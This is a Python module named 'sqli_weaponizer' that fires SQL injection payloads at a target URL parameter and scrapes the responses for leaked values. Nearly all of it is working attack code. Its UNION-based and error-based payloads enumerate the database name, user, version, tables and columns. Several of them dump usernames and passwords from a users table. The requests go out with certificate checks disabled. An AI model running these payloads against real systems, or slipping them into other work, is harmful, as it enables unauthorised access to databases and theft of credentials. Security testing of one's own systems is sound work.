import re
from typing import Optional, Dict
import requests

from tools.log_utils import get_logger

logger = get_logger("sqli_weaponizer")

EXTRACT_PAYLOADS = [
    ("UNION SELECT 1,2,3-- ", 1),
    ("' UNION SELECT 1,2,3-- ", 1),
    ("' UNION SELECT 1,database(),3-- ", 1),
    ("' UNION SELECT 1,user(),3-- ", 1),
    ("' UNION SELECT 1,@@version,3-- ", 1),
    ("' UNION SELECT 1,table_name,3 FROM information_schema.tables-- ", 1),
    ("' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- ", 1),
    ("' UNION SELECT 1,group_concat(0x7c,username,0x7c,password,0x7c),3 FROM users-- ", 1),
]

ERROR_EXTRACT = [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- ",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- ",
    "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)-- ",
]


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "data": [], "type": None}

    for payload, _ in EXTRACT_PAYLOADS:
        try:
            sep = "&" if "?" in url else "?"
            r = sess.get("%s%s%s=%s" % (url, sep, param, payload), timeout=timeout, verify=False)
            body = r.text
            for potential in re.findall(r'\b(\d[\w@\.\-]{4,})\b', body):
                if any(c in potential for c in ['@', '.', ':', '/']):
                    result["vulnerable"] = True
                    result["data"].append({"source": "extraction", "value": potential[:100]})
                    result["type"] = "union"
                    break
        except Exception as e:
            logger.debug("sqli_weaponizer union: %s", e)
        if result["vulnerable"]:
            break

    if not result["vulnerable"]:
        for payload in ERROR_EXTRACT:
            try:
                sep = "&" if "?" in url else "?"
                r = sess.get("%s%s%s=%s" % (url, sep, param, payload), timeout=timeout, verify=False)
                m = re.search(r'~(.+?)[\'"]', r.text)
                if m:
                    result["vulnerable"] = True
                    result["data"].append({"source": "error_based", "value": m.group(1)[:100]})
                    result["type"] = "error_based"
                    break
            except Exception as e:
                logger.debug("sqli_weaponizer error: %s", e)

    return result
